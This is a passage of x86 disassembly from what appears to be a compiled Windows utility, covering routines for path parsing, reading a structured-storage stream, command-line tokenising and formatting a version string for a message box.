  4037cb:	call   esi
  4037cd:	mov    eax,DWORD PTR [ebp-0xc]
  4037d0:	pop    ebx
  4037d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4037d4:	xor    ecx,ebp
  4037d6:	pop    esi
  4037d7:	call   0x409090
  4037dc:	mov    esp,ebp
  4037de:	pop    ebp
  4037df:	ret    
  4037e0:	int3   
  4037e1:	int3   
  4037e2:	int3   
  4037e3:	int3   
  4037e4:	int3   
  4037e5:	mov    edi,edi
  4037e7:	push   ebp
  4037e8:	mov    ebp,esp
  4037ea:	push   edi
  4037eb:	mov    edi,ecx
  4037ed:	mov    edx,edi
  4037ef:	mov    eax,edi
  4037f1:	test   edi,edi
  4037f3:	je     0x40388a
  4037f9:	push   ebx
  4037fa:	xor    ebx,ebx
  4037fc:	cmp    WORD PTR [edi],bx
  4037ff:	je     0x40381d
  403801:	movzx  ecx,WORD PTR [edx]
  403804:	cmp    ecx,0x5c
  403807:	jne    0x403810
  403809:	lea    eax,[edx+0x2]
  40380c:	mov    edx,eax
  40380e:	jmp    0x403818
  403810:	test   cx,cx
  403813:	je     0x40381d
  403815:	add    edx,0x2
  403818:	cmp    WORD PTR [edx],bx
  40381b:	jne    0x403801
  40381d:	push   0x2e
  40381f:	pop    edx
  403820:	jmp    0x40382f
  403822:	cmp    cx,dx
  403825:	je     0x40383c
  403827:	test   cx,cx
  40382a:	je     0x403837
  40382c:	add    eax,0x2
  40382f:	movzx  ecx,WORD PTR [eax]
  403832:	test   cx,cx
  403835:	jne    0x403822
  403837:	cmp    WORD PTR [eax],dx
  40383a:	jne    0x403840
  40383c:	xor    eax,eax
  40383e:	jmp    0x403889
  403840:	push   esi
  403841:	push   edi
  403842:	call   DWORD PTR ds:0x40e0ec
  403848:	push   ebx
  403849:	mov    ebx,0x401fe0
  40384e:	push   ebx
  40384f:	lea    esi,[eax+0x1]
  403852:	call   DWORD PTR ds:0x40e0ec
  403858:	add    eax,esi
  40385a:	mov    esi,DWORD PTR [ebp+0x8]
  40385d:	push   eax
  40385e:	mov    ecx,esi
  403860:	call   0x407ef5
  403865:	mov    edx,DWORD PTR [esi+0x4]
  403868:	mov    ecx,DWORD PTR [esi]
  40386a:	push   edi
  40386b:	call   0x4026d5
  403870:	test   eax,eax
  403872:	jne    0x403886
  403874:	mov    edx,DWORD PTR [esi+0x4]
  403877:	mov    ecx,DWORD PTR [esi]
  403879:	push   ebx
  40387a:	call   0x40275f
  40387f:	test   eax,eax
  403881:	jne    0x403886
  403883:	inc    eax
  403884:	jmp    0x403888
  403886:	xor    eax,eax
  403888:	pop    esi
  403889:	pop    ebx
  40388a:	pop    edi
  40388b:	pop    ebp
  40388c:	ret    
  40388d:	int3   
  40388e:	int3   
  40388f:	int3   
  403890:	int3   
  403891:	int3   
  403892:	mov    edi,edi
  403894:	push   ebp
  403895:	mov    ebp,esp
  403897:	sub    esp,0x4c
  40389a:	mov    eax,ds:0x40b000
  40389f:	xor    eax,ebp
  4038a1:	mov    DWORD PTR [ebp-0x4],eax
  4038a4:	push   ebx
  4038a5:	push   esi
  4038a6:	push   edi
  4038a7:	xor    ebx,ebx
  4038a9:	lea    eax,[ebp-0x38]
  4038ac:	push   eax
  4038ad:	push   ebx
  4038ae:	push   ebx
  4038af:	push   0x20
  4038b1:	push   ebx
  4038b2:	push   ecx
  4038b3:	mov    edi,edx
  4038b5:	mov    DWORD PTR [ebp-0x38],ebx
  4038b8:	mov    DWORD PTR [ebp-0x30],ebx
  4038bb:	call   DWORD PTR ds:0x40e1f4
  4038c1:	mov    ecx,eax
  4038c3:	test   ecx,ecx
  4038c5:	jns    0x4038e2
  4038c7:	xor    eax,eax
  4038c9:	cmp    ecx,0x80030002
  4038cf:	setne  al
  4038d2:	dec    eax
  4038d3:	and    eax,0xfffff9af
  4038d8:	add    eax,0x653
  4038dd:	jmp    0x403b10
  4038e2:	mov    eax,DWORD PTR [ebp-0x38]
  4038e5:	lea    ecx,[ebp-0x30]
  4038e8:	push   ecx
  4038e9:	push   ebx
  4038ea:	push   0x10
  4038ec:	mov    esi,DWORD PTR [eax]
  4038ee:	push   ebx
  4038ef:	push   0x401f90
  4038f4:	push   eax
  4038f5:	mov    ecx,DWORD PTR [esi+0x10]
  4038f8:	call   DWORD PTR ds:0x40e20c
  4038fe:	call   DWORD PTR [esi+0x10]
  403901:	test   eax,eax
  403903:	jns    0x403922
  403905:	mov    eax,DWORD PTR [ebp-0x38]
  403908:	push   eax
  403909:	mov    ecx,DWORD PTR [eax]
  40390b:	mov    esi,DWORD PTR [ecx+0x8]
  40390e:	mov    ecx,esi
  403910:	call   DWORD PTR ds:0x40e20c
  403916:	call   esi
  403918:	mov    eax,0x654
  40391d:	jmp    0x403b10
  403922:	mov    eax,DWORD PTR [ebp-0x30]
  403925:	push   ebx
  403926:	push   ebx
  403927:	push   ebx
  403928:	mov    esi,DWORD PTR [eax]
  40392a:	push   0x2c
  40392c:	push   eax
  40392d:	mov    ecx,DWORD PTR [esi+0x14]
  403930:	call   DWORD PTR ds:0x40e20c
  403936:	call   DWORD PTR [esi+0x14]
  403939:	test   eax,eax
  40393b:	js     0x403ad5
  403941:	mov    eax,DWORD PTR [ebp-0x30]
  403944:	lea    ecx,[ebp-0x34]
  403947:	push   ecx
  403948:	push   0x4
  40394a:	lea    ecx,[ebp-0x48]
  40394d:	mov    esi,DWORD PTR [eax]
  40394f:	push   ecx
  403950:	push   eax
  403951:	mov    ecx,DWORD PTR [esi+0xc]
  403954:	call   DWORD PTR ds:0x40e20c
  40395a:	call   DWORD PTR [esi+0xc]
  40395d:	test   eax,eax
  40395f:	js     0x403ad5
  403965:	cmp    DWORD PTR [ebp-0x34],0x4
  403969:	jne    0x403ad5
  40396f:	mov    eax,DWORD PTR [ebp-0x30]
  403972:	push   ebx
  403973:	push   ebx
  403974:	push   ebx
  403975:	mov    esi,DWORD PTR [eax]
  403977:	push   DWORD PTR [ebp-0x48]
  40397a:	push   eax
  40397b:	mov    ecx,DWORD PTR [esi+0x14]
  40397e:	call   DWORD PTR ds:0x40e20c
  403984:	call   DWORD PTR [esi+0x14]
  403987:	test   eax,eax
  403989:	js     0x403ad5
  40398f:	mov    eax,DWORD PTR [ebp-0x30]
  403992:	lea    ecx,[ebp-0x34]
  403995:	push   ecx
  403996:	push   0x4
  403998:	lea    ecx,[ebp-0x40]
  40399b:	mov    esi,DWORD PTR [eax]
  40399d:	push   ecx
  40399e:	push   eax
  40399f:	mov    ecx,DWORD PTR [esi+0xc]
  4039a2:	call   DWORD PTR ds:0x40e20c
  4039a8:	call   DWORD PTR [esi+0xc]
  4039ab:	test   eax,eax
  4039ad:	js     0x403ad5
  4039b3:	cmp    DWORD PTR [ebp-0x34],0x4
  4039b7:	jne    0x403ad5
  4039bd:	mov    eax,DWORD PTR [ebp-0x30]
  4039c0:	lea    ecx,[ebp-0x34]
  4039c3:	push   ecx
  4039c4:	push   0x4
  4039c6:	lea    ecx,[ebp-0x4c]
  4039c9:	mov    esi,DWORD PTR [eax]
  4039cb:	push   ecx
  4039cc:	push   eax
  4039cd:	mov    ecx,DWORD PTR [esi+0xc]
  4039d0:	call   DWORD PTR ds:0x40e20c
  4039d6:	call   DWORD PTR [esi+0xc]
  4039d9:	test   eax,eax
  4039db:	js     0x403ad5
  4039e1:	cmp    DWORD PTR [ebp-0x34],0x4
  4039e5:	jne    0x403ad5
  4039eb:	mov    eax,ebx
  4039ed:	mov    DWORD PTR [ebp-0x44],ebx
  4039f0:	mov    DWORD PTR [ebp-0x3c],eax
  4039f3:	cmp    DWORD PTR [ebp-0x40],eax
  4039f6:	je     0x403ad5
  4039fc:	cmp    eax,0x9
  4039ff:	je     0x403a6a
  403a01:	mov    eax,DWORD PTR [ebp-0x30]
  403a04:	lea    ecx,[ebp-0x34]
  403a07:	push   ecx
  403a08:	push   0x4
  403a0a:	lea    ecx,[ebp-0x3c]
  403a0d:	mov    esi,DWORD PTR [eax]
  403a0f:	push   ecx
  403a10:	push   eax
  403a11:	mov    ecx,DWORD PTR [esi+0xc]
  403a14:	call   DWORD PTR ds:0x40e20c
  403a1a:	call   DWORD PTR [esi+0xc]
  403a1d:	test   eax,eax
  403a1f:	js     0x403ad5
  403a25:	cmp    DWORD PTR [ebp-0x34],0x4
  403a29:	jne    0x403ad5
  403a2f:	mov    eax,DWORD PTR [ebp-0x30]
  403a32:	lea    ecx,[ebp-0x34]
  403a35:	push   ecx
  403a36:	push   0x4
  403a38:	lea    ecx,[ebp-0x44]
  403a3b:	mov    esi,DWORD PTR [eax]
  403a3d:	push   ecx
  403a3e:	push   eax
  403a3f:	mov    ecx,DWORD PTR [esi+0xc]
  403a42:	call   DWORD PTR ds:0x40e20c
  403a48:	call   DWORD PTR [esi+0xc]
  403a4b:	test   eax,eax
  403a4d:	js     0x403ad5
  403a53:	cmp    DWORD PTR [ebp-0x34],0x4
  403a57:	jne    0x403ad5
  403a59:	sub    DWORD PTR [ebp-0x40],0x8
  403a5d:	je     0x403a64
  403a5f:	mov    eax,DWORD PTR [ebp-0x3c]
  403a62:	jmp    0x4039fc
  403a64:	cmp    DWORD PTR [ebp-0x3c],0x9
  403a68:	jne    0x403ad5
  403a6a:	mov    eax,DWORD PTR [ebp-0x44]
  403a6d:	mov    ecx,DWORD PTR [ebp-0x48]
  403a70:	add    eax,0x8
  403a73:	add    ecx,eax
  403a75:	mov    eax,DWORD PTR [ebp-0x30]
  403a78:	push   ebx
  403a79:	push   ebx
  403a7a:	push   ebx
  403a7b:	mov    esi,DWORD PTR [eax]
  403a7d:	push   ecx
  403a7e:	push   eax
  403a7f:	mov    ecx,DWORD PTR [esi+0x14]
  403a82:	call   DWORD PTR ds:0x40e20c
  403a88:	call   DWORD PTR [esi+0x14]
  403a8b:	test   eax,eax
  403a8d:	js     0x403ad5
  403a8f:	mov    eax,DWORD PTR [ebp-0x30]
  403a92:	lea    ecx,[ebp-0x34]
  403a95:	push   ecx
  403a96:	push   0x26
  403a98:	lea    ecx,[ebp-0x2c]
  403a9b:	mov    esi,DWORD PTR [eax]
  403a9d:	push   ecx
  403a9e:	push   eax
  403a9f:	mov    ecx,DWORD PTR [esi+0xc]
  403aa2:	call   DWORD PTR ds:0x40e20c
  403aa8:	call   DWORD PTR [esi+0xc]
  403aab:	test   eax,eax
  403aad:	js     0x403ad5
  403aaf:	cmp    DWORD PTR [ebp-0x34],0x26
  403ab3:	jne    0x403ad5
  403ab5:	push   0x27
  403ab7:	push   edi
  403ab8:	push   0x27
  403aba:	lea    eax,[ebp-0x2c]
  403abd:	mov    BYTE PTR [ebp-0x6],bl
  403ac0:	push   eax
  403ac1:	push   ebx
  403ac2:	push   ebx
  403ac3:	call   DWORD PTR ds:0x40e0e8
  403ac9:	test   eax,eax
  403acb:	je     0x403ad5
  403acd:	xor    eax,eax
  403acf:	mov    bl,0x1
  403ad1:	mov    WORD PTR [edi+0x4c],ax
  403ad5:	mov    ecx,DWORD PTR [ebp-0x30]
  403ad8:	test   ecx,ecx
  403ada:	je     0x403aec
  403adc:	mov    eax,DWORD PTR [ecx]
  403ade:	push   ecx
  403adf:	mov    esi,DWORD PTR [eax+0x8]
  403ae2:	mov    ecx,esi
  403ae4:	call   DWORD PTR ds:0x40e20c
  403aea:	call   esi
  403aec:	mov    ecx,DWORD PTR [ebp-0x38]
  403aef:	test   ecx,ecx
  403af1:	je     0x403b03
  403af3:	mov    eax,DWORD PTR [ecx]
  403af5:	push   ecx
  403af6:	mov    esi,DWORD PTR [eax+0x8]
  403af9:	mov    ecx,esi
  403afb:	call   DWORD PTR ds:0x40e20c
  403b01:	call   esi
  403b03:	xor    eax,eax
  403b05:	test   bl,bl
  403b07:	setne  al
  403b0a:	dec    eax
  403b0b:	and    eax,0x654
  403b10:	mov    ecx,DWORD PTR [ebp-0x4]
  403b13:	pop    edi
  403b14:	pop    esi
  403b15:	xor    ecx,ebp
  403b17:	pop    ebx
  403b18:	call   0x409090
  403b1d:	mov    esp,ebp
  403b1f:	pop    ebp
  403b20:	ret    
  403b21:	int3   
  403b22:	int3   
  403b23:	int3   
  403b24:	int3   
  403b25:	int3   
  403b26:	mov    edi,edi
  403b28:	push   ebp
  403b29:	mov    ebp,esp
  403b2b:	sub    esp,0x18
  403b2e:	push   ebx
  403b2f:	push   esi
  403b30:	mov    esi,ecx
  403b32:	xor    ebx,ebx
  403b34:	push   edi
  403b35:	mov    edi,edx
  403b37:	mov    DWORD PTR [ebp-0x18],edi
  403b3a:	mov    eax,DWORD PTR [esi]
  403b3c:	mov    DWORD PTR [edi],ebx
  403b3e:	test   eax,eax
  403b40:	je     0x403c1c
  403b46:	cmp    WORD PTR [eax],bx
  403b49:	je     0x403c1c
  403b4f:	push   0x20
  403b51:	pop    edx
  403b52:	mov    DWORD PTR [ebp-0xc],edx
  403b55:	mov    DWORD PTR [ebp-0x8],0x9
  403b5c:	mov    ecx,DWORD PTR [esi]
  403b5e:	movzx  eax,WORD PTR [ecx]
  403b61:	cmp    ax,dx
  403b64:	je     0x403b6c
  403b66:	cmp    ax,WORD PTR [ebp-0x8]
  403b6a:	jne    0x403b76
  403b6c:	lea    eax,[ecx+0x2]
  403b6f:	mov    DWORD PTR [esi],eax
  403b71:	cmp    WORD PTR [eax],bx
  403b74:	jne    0x403b5c
  403b76:	mov    edx,DWORD PTR [esi]
  403b78:	mov    DWORD PTR [ebp-0x14],edx
  403b7b:	movzx  ecx,WORD PTR [edx]
  403b7e:	test   cx,cx
  403b81:	je     0x403c1c
  403b87:	push   0x22
  403b89:	pop    eax
  403b8a:	sub    ax,cx
  403b8d:	lea    ecx,[edx+0x2]
  403b90:	neg    ax
  403b93:	mov    DWORD PTR [esi],ecx
  403b95:	sbb    al,al
  403b97:	and    al,0x1
  403b99:	cmp    WORD PTR [ecx],bx
  403b9c:	je     0x403bec
  403b9e:	push   0x22
  403ba0:	mov    dl,bl
  403ba2:	pop    edi
  403ba3:	movzx  ebx,WORD PTR [ecx]
  403ba6:	mov    DWORD PTR [ebp-0x10],ebx
  403ba9:	movzx  ebx,bx
  403bac:	cmp    bx,WORD PTR [ebp-0xc]
  403bb0:	je     0x403bbc
  403bb2:	cmp    bx,WORD PTR [ebp-0x8]
  403bb6:	je     0x403bbc
  403bb8:	xor    bh,bh
  403bba:	jmp    0x403bbe
  403bbc:	mov    bh,0x1
  403bbe:	cmp    di,WORD PTR [ebp-0x10]
  403bc2:	sete   bl
  403bc5:	test   bh,bh
  403bc7:	jne    0x403bcd
  403bc9:	test   bl,bl
  403bcb:	je     0x403c0e
  403bcd:	test   al,al
  403bcf:	je     0x403c0a
  403bd1:	test   bl,bl
  403bd3:	je     0x403bdc
  403bd5:	test   dl,dl
  403bd7:	sete   dl
  403bda:	jmp    0x403c0e
  403bdc:	test   bh,bh
  403bde:	je     0x403c0e
  403be0:	test   dl,dl
  403be2:	jne    0x403c0e
  403be4:	xor    ebx,ebx
  403be6:	mov    edx,DWORD PTR [ebp-0x14]
  403be9:	mov    edi,DWORD PTR [ebp-0x18]
  403bec:	mov    DWORD PTR [edi],ebx
  403bee:	test   al,al
  403bf0:	jne    0x403bfe
  403bf2:	mov    ecx,DWORD PTR [esi]
  403bf4:	cmp    WORD PTR [ecx],bx
  403bf7:	je     0x403bfe
  403bf9:	add    ecx,0x2
  403bfc:	mov    DWORD PTR [esi],ecx
  403bfe:	mov    ecx,DWORD PTR [esi]
  403c00:	mov    eax,edx
  403c02:	sub    ecx,edx
  403c04:	sar    ecx,1
  403c06:	mov    DWORD PTR [edi],ecx
  403c08:	jmp    0x403c1e
  403c0a:	test   bl,bl
  403c0c:	jne    0x403be4
  403c0e:	add    ecx,0x2
  403c11:	xor    ebx,ebx
  403c13:	mov    DWORD PTR [esi],ecx
  403c15:	cmp    WORD PTR [ecx],bx
  403c18:	jne    0x403ba3
  403c1a:	jmp    0x403be6
  403c1c:	xor    eax,eax
  403c1e:	pop    edi
  403c1f:	pop    esi
  403c20:	pop    ebx
  403c21:	mov    esp,ebp
  403c23:	pop    ebp
  403c24:	ret    
  403c25:	int3   
  403c26:	int3   
  403c27:	int3   
  403c28:	int3   
  403c29:	int3   
  403c2a:	mov    edi,edi
  403c2c:	push   ebp
  403c2d:	mov    ebp,esp
  403c2f:	push   ecx
  403c30:	push   ecx
  403c31:	and    DWORD PTR [ebp-0x4],0x0
  403c35:	lea    eax,[ebp-0x4]
  403c38:	push   esi
  403c39:	mov    esi,ecx
  403c3b:	mov    DWORD PTR [ebp-0x8],edx
  403c3e:	push   eax
  403c3f:	mov    ecx,DWORD PTR [esi]
  403c41:	call   0x40288c
  403c46:	test   eax,eax
  403c48:	jns    0x403c51
  403c4a:	mov    eax,0x65b
  403c4f:	jmp    0x403cd0
  403c51:	xor    eax,eax
  403c53:	cmp    BYTE PTR [ebp+0xc],al
  403c56:	push   ebx
  403c57:	mov    ebx,DWORD PTR [ebp+0x8]
  403c5a:	setne  al
  403c5d:	inc    eax
  403c5e:	add    eax,ebx
  403c60:	push   edi
  403c61:	mov    edi,DWORD PTR [ebp-0x4]
  403c64:	cmp    eax,ebx
  403c66:	jbe    0x403c89
  403c68:	lea    ecx,[edi+eax*2]
  403c6b:	cmp    ecx,edi
  403c6d:	jbe    0x403c89
  403c6f:	add    eax,edi
  403c71:	cmp    eax,DWORD PTR [esi+0x4]
  403c74:	jbe    0x403c89
  403c76:	push   0x1
  403c78:	push   ecx
  403c79:	mov    ecx,esi
  403c7b:	call   0x407ef5
  403c80:	test   al,al
  403c82:	jne    0x403c89
  403c84:	push   0xe
  403c86:	pop    eax
  403c87:	jmp    0x403cce
  403c89:	mov    eax,DWORD PTR [esi]
  403c8b:	mov    edx,DWORD PTR [esi+0x4]
  403c8e:	push   ebx
  403c8f:	push   DWORD PTR [ebp-0x8]
  403c92:	sub    edx,edi
  403c94:	lea    ecx,[eax+edi*2]
  403c97:	call   0x402713
  403c9c:	test   eax,eax
  403c9e:	js     0x403cc9
  403ca0:	cmp    BYTE PTR [ebp+0xc],0x0
  403ca4:	je     0x403cc5
  403ca6:	mov    ecx,DWORD PTR [esi]
  403ca8:	lea    eax,[edi+ebx*1]
  403cab:	mov    edx,DWORD PTR [esi+0x4]
  403cae:	push   0x1
  403cb0:	sub    edx,edi
  403cb2:	push   0x4012d4
  403cb7:	sub    edx,ebx
  403cb9:	lea    ecx,[ecx+eax*2]
  403cbc:	call   0x402713
  403cc1:	test   eax,eax
  403cc3:	js     0x403cc9
  403cc5:	xor    eax,eax
  403cc7:	jmp    0x403cce
  403cc9:	mov    eax,0x65b
  403cce:	pop    edi
  403ccf:	pop    ebx
  403cd0:	pop    esi
  403cd1:	mov    esp,ebp
  403cd3:	pop    ebp
  403cd4:	ret    
  403cd5:	int3   
  403cd6:	int3   
  403cd7:	int3   
  403cd8:	int3   
  403cd9:	int3   
  403cda:	mov    edi,edi
  403cdc:	push   ecx
  403cdd:	push   0x0
  403cdf:	push   0x0
  403ce1:	call   0x403cf0
  403ce6:	pop    ecx
  403ce7:	pop    ecx
  403ce8:	pop    ecx
  403ce9:	ret    
  403cea:	int3   
  403ceb:	int3   
  403cec:	int3   
  403ced:	int3   
  403cee:	int3   
  403cef:	int3   
  403cf0:	push   0xa8
  403cf5:	push   0x409eb0
  403cfa:	call   0x409a1c
  403cff:	xor    edi,edi
  403d01:	inc    edi
  403d02:	mov    DWORD PTR [ebp-0x80],edi
  403d05:	lea    eax,[ebp-0x78]
  403d08:	mov    DWORD PTR [ebp-0x84],eax
  403d0e:	mov    DWORD PTR [ebp-0x90],edi
  403d14:	lea    eax,[ebp-0x88]
  403d1a:	mov    DWORD PTR [ebp-0x94],eax
  403d20:	push   ecx
  403d21:	mov    esi,0x1388
  403d26:	push   esi
  403d27:	lea    ecx,[ebp-0x84]
  403d2d:	call   0x407f90
  403d32:	test   al,al
  403d34:	je     0x403f84
  403d3a:	push   ecx
  403d3b:	push   esi
  403d3c:	lea    ecx,[ebp-0x94]
  403d42:	call   0x407f90
  403d47:	test   al,al
  403d49:	je     0x403f84
  403d4f:	xor    ebx,ebx
  403d51:	push   ebx
  403d52:	push   DWORD PTR [ebp-0x80]
  403d55:	push   DWORD PTR [ebp-0x84]
  403d5b:	push   0xa
  403d5d:	push   0xffffffff
  403d5f:	call   DWORD PTR ds:0x40f038
  403d65:	mov    DWORD PTR [ebp-0xac],eax
  403d6b:	mov    DWORD PTR [ebp-0xa0],edi
  403d71:	lea    eax,[ebp-0x98]
  403d77:	mov    DWORD PTR [ebp-0xa4],eax
  403d7d:	push   ecx
  403d7e:	mov    esi,0x104
  403d83:	push   esi
  403d84:	lea    ecx,[ebp-0xa4]
  403d8a:	call   0x407f90
  403d8f:	test   al,al
  403d91:	je     0x403f79
  403d97:	push   esi
  403d98:	push   DWORD PTR [ebp-0xa4]
  403d9e:	push   DWORD PTR ds:0x40cc18
  403da4:	call   DWORD PTR ds:0x40e0d8
  403daa:	test   eax,eax
  403dac:	je     0x403f79
  403db2:	xor    ecx,ecx
  403db4:	mov    eax,DWORD PTR [ebp-0xa4]
  403dba:	mov    WORD PTR [eax+0x206],cx
  403dc1:	mov    DWORD PTR [ebp-0x4],ebx
  403dc4:	lea    eax,[ebp-0xb0]
  403dca:	push   eax
  403dcb:	push   DWORD PTR [ebp-0xa4]
  403dd1:	mov    esi,DWORD PTR ds:0x40b070
  403dd7:	mov    ecx,esi
  403dd9:	call   DWORD PTR ds:0x40e20c
  403ddf:	call   esi
  403de1:	mov    esi,eax
  403de3:	mov    DWORD PTR [ebp-0xb8],esi
  403de9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  403df0:	jmp    0x403e13
  403df2:	xor    eax,eax
  403df4:	inc    eax
  403df5:	ret    
  403df6:	mov    esp,DWORD PTR [ebp-0x18]
  403df9:	xor    ebx,ebx
  403dfb:	mov    esi,ebx
  403dfd:	mov    DWORD PTR [ebp-0xb8],esi
  403e03:	mov    DWORD PTR [ebp-0xb0],ebx
  403e09:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  403e10:	xor    edi,edi
  403e12:	inc    edi
  403e13:	test   esi,esi
  403e15:	je     0x403f79
  403e1b:	mov    ecx,edi
  403e1d:	mov    DWORD PTR [ebp-0x70],ecx
  403e20:	lea    eax,[ebp-0x68]
  403e23:	mov    DWORD PTR [ebp-0x74],eax
  403e26:	cmp    esi,edi
  403e28:	jle    0x403e43
  403e2a:	push   esi
  403e2b:	push   0x40
  403e2d:	call   DWORD PTR ds:0x40e0b4
  403e33:	mov    edx,eax
  403e35:	mov    DWORD PTR [ebp-0xa8],eax
  403e3b:	mov    ecx,DWORD PTR [ebp-0x70]
  403e3e:	mov    eax,DWORD PTR [ebp-0x74]
  403e41:	jmp    0x403e4c
  403e43:	lea    edx,[ebp-0x68]
  403e46:	mov    DWORD PTR [ebp-0xa8],edx
  403e4c:	test   edx,edx
  403e4e:	je     0x403f65
  403e54:	lea    ecx,[ebp-0x68]
  403e57:	cmp    eax,ecx
  403e59:	je     0x403e68
  403e5b:	push   eax
  403e5c:	call   DWORD PTR ds:0x40e104
  403e62:	mov    edx,DWORD PTR [ebp-0xa8]
  403e68:	mov    DWORD PTR [ebp-0x74],edx
  403e6b:	mov    DWORD PTR [ebp-0x70],esi
  403e6e:	push   edx
  403e6f:	push   esi
  403e70:	push   DWORD PTR [ebp-0xb0]
  403e76:	push   DWORD PTR [ebp-0xa4]
  403e7c:	mov    esi,DWORD PTR ds:0x40b06c
  403e82:	mov    ecx,esi
  403e84:	call   DWORD PTR ds:0x40e20c
  403e8a:	call   esi
  403e8c:	test   eax,eax
  403e8e:	je     0x403ee2
  403e90:	lea    eax,[ebp-0xa8]
  403e96:	push   eax
  403e97:	lea    eax,[ebp-0xb4]
  403e9d:	push   eax
  403e9e:	push   0x4011d8
  403ea3:	push   DWORD PTR [ebp-0x74]
  403ea6:	mov    esi,DWORD PTR ds:0x40b068
  403eac:	mov    ecx,esi
  403eae:	call   DWORD PTR ds:0x40e20c
  403eb4:	call   esi
  403eb6:	test   eax,eax
  403eb8:	je     0x403ed1
  403eba:	cmp    DWORD PTR [ebp-0xa8],0x0
  403ec1:	jbe    0x403ed1
  403ec3:	mov    eax,DWORD PTR [ebp-0xb4]
  403ec9:	mov    ecx,DWORD PTR [eax+0x8]
  403ecc:	mov    edx,DWORD PTR [eax+0xc]
  403ecf:	jmp    0x403ee6
  403ed1:	cmp    DWORD PTR [ebp-0x70],edi
  403ed4:	jle    0x403f70
  403eda:	push   DWORD PTR [ebp-0x74]
  403edd:	jmp    0x403f6a
  403ee2:	mov    ecx,ebx
  403ee4:	mov    edx,ebx
  403ee6:	movzx  eax,dx
  403ee9:	push   eax
  403eea:	shr    edx,0x10
  403eed:	push   edx
  403eee:	movzx  eax,cx
  403ef1:	push   eax
  403ef2:	shr    ecx,0x10
  403ef5:	push   ecx
  403ef6:	push   0x4012d8
  403efb:	push   0x20
  403efd:	lea    eax,[ebp-0x64]
  403f00:	push   eax
  403f01:	call   0x402820
  403f06:	add    esp,0x1c
  403f09:	test   eax,eax
  403f0b:	js     0x403ed1
  403f0d:	lea    eax,[ebp-0x64]
  403f10:	push   eax
  403f11:	push   DWORD PTR [ebp-0x84]
  403f17:	push   DWORD PTR [ebp-0x90]
  403f1d:	push   DWORD PTR [ebp-0x94]
  403f23:	call   0x402820
  403f28:	add    esp,0x10
  403f2b:	push   0x69
  403f2d:	pop    eax
  403f2e:	cmp    DWORD PTR [ebp-0xac],0x4e8
  403f38:	je     0x403f46
  403f3a:	cmp    DWORD PTR [ebp-0xac],0x4e7
  403f44:	jne    0x403f49
  403f46:	push   0x78
  403f48:	pop    eax
  403f49:	push   eax
  403f4a:	push   ebx
  403f4b:	push   DWORD PTR [ebp-0xac]
  403f51:	push   ebx
  403f52:	push   ebx
  403f53:	push   DWORD PTR [ebp-0x94]
  403f59:	push   ebx
  403f5a:	call   DWORD PTR ds:0x40f018
  403f60:	jmp    0x403ed1
  403f65:	cmp    ecx,edi
  403f67:	jle    0x403f70
  403f69:	push   eax
  403f6a:	call   DWORD PTR ds:0x40e104
  403f70:	lea    eax,[ebp-0x68]
  403f73:	mov    DWORD PTR [ebp-0x74],eax
  403f76:	mov    DWORD PTR [ebp-0x70],edi
  403f79:	lea    ecx,[ebp-0xa4]
  403f7f:	call   0x407f6a
  403f84:	lea    ecx,[ebp-0x94]
  403f8a:	call   0x407f6a
  403f8f:	lea    ecx,[ebp-0x84]
  403f95:	call   0x407f6a
  403f9a:	mov    eax,0x8000
  403f9f:	call   0x409a64
  403fa4:	ret    
  403fa5:	int3   
  403fa6:	int3   
  403fa7:	int3   
  403fa8:	int3   
  403fa9:	int3   
  403faa:	int3   
  403fab:	int3   
  403fac:	int3   
  403fad:	int3   
  403fae:	int3   
  403faf:	int3   
  403fb0:	mov    edi,edi
  403fb2:	push   ebp
  403fb3:	mov    ebp,esp
  403fb5:	mov    eax,DWORD PTR [ebp+0x8]
  403fb8:	xor    ecx,ecx
  403fba:	test   eax,eax
  403fbc:	je     0x403fc3
  403fbe:	cmp    WORD PTR [eax],cx
  403fc1:	jne    0x403fcf
  403fc3:	mov    eax,DWORD PTR [ebp+0xc]
  403fc6:	test   eax,eax
  403fc8:	je     0x403fd6
  403fca:	cmp    WORD PTR [eax],cx
  403fcd:	je     0x403fd6
  403fcf:	mov    eax,0x667
  403fd4:	pop    ebp
  403fd5:	ret    
  403fd6:	mov    BYTE PTR ds:0x40cb9c,0x1
  403fdd:	xor    eax,eax
  403fdf:	pop    ebp
  403fe0:	ret    
  403fe1:	int3   
  403fe2:	int3   
  403fe3:	int3   
  403fe4:	int3   
  403fe5:	int3   
  403fe6:	int3   
  403fe7:	int3   
  403fe8:	int3   
  403fe9:	int3   
  403fea:	int3   
  403feb:	int3   
  403fec:	int3   
  403fed:	int3   
  403fee:	int3   
  403fef:	int3   
  403ff0:	mov    edi,edi
  403ff2:	push   ebp
  403ff3:	mov    ebp,esp
  403ff5:	cmp    DWORD PTR [ebp+0xc],0x0
  403ff9:	je     0x40400d
  403ffb:	push   0x26
  403ffd:	push   DWORD PTR [ebp+0xc]
  404000:	mov    ecx,0x40cbc0
  404005:	push   0x27
  404007:	pop    edx
  404008:	call   0x402713
  40400d:	xor    eax,eax
  40400f:	pop    ebp
  404010:	ret    
  404011:	int3   
  404012:	int3   
  404013:	int3   
  404014:	int3   
  404015:	int3   
  404016:	int3   
  404017:	int3   
  404018:	int3   
  404019:	int3   
  40401a:	int3   
  40401b:	int3   
  40401c:	int3   
  40401d:	int3   
  40401e:	int3   
  40401f:	int3   
  404020:	mov    edi,edi
  404022:	push   ebp
  404023:	mov    ebp,esp
  404025:	cmp    DWORD PTR [ebp+0xc],0x0
  404029:	je     0x404061
  40402b:	push   DWORD PTR [ebp+0xc]
  40402e:	call   DWORD PTR ds:0x40e0ec
  404034:	inc    eax
  404035:	mov    ecx,0x40b0b0
  40403a:	push   eax
  40403b:	call   0x408029
  404040:	test   al,al
  404042:	je     0x40405c
  404044:	push   DWORD PTR [ebp+0xc]
  404047:	mov    edx,DWORD PTR ds:0x40b0b4
  40404d:	mov    ecx,DWORD PTR ds:0x40b0b0
  404053:	call   0x4026d5
  404058:	test   eax,eax
  40405a:	jns    0x404061
  40405c:	xor    eax,eax
  40405e:	inc    eax
  40405f:	pop    ebp
  404060:	ret    
  404061:	xor    eax,eax
  404063:	pop    ebp
  404064:	ret    
  404065:	int3   
  404066:	int3   
  404067:	int3   
  404068:	int3   
  404069:	int3   
  40406a:	mov    edi,edi
  40406c:	push   ebx
  40406d:	push   edi
  40406e:	mov    ebx,ecx
  404070:	push   ebx
  404071:	call   DWORD PTR ds:0x40e0ec
